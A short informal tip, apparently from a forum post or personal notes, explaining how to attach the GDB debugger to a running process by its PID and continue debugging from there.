use GDB to type 'attach PID' (obv replace PID)
then you can use GDB as usual (you may have to type c in both terminals)